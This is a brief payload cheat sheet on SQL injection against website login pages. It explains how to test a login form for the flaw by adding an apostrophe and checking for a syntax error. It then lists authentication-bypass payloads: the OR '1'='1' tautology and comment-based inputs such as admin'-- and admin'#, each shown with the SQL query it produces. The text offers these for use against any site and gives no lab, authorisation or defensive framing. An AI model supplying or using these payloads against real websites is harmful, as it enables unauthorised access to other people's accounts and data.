TO USE THESE PAYLOADS MAKE SURE SQL INJECTION WORKS ON THE WEBSITE LOGIN PAGE OR NOT...
1) next to the username you have entered without a space add a single apostrophe. 
2)Check if the error message while logging in has changed, for example:- SYNTAX ERROR, if it did! The website login page is vulnerable to SQL Injections 


OR PAYLOAD 

Example:- SELECT * FROM users WHERE username ='admin' OR '1'='1' AND password='password123'  --> How it would look:- In username - admin' OR '1' = '1

Comment PAYLOAD

Example:- SELECT * FROM users WHERE username ='admin'# AND password='password123'   /     SELECT * FROM users WHERE username ='admin'-- AND password='password123' > How it would look:- In username - admin'--
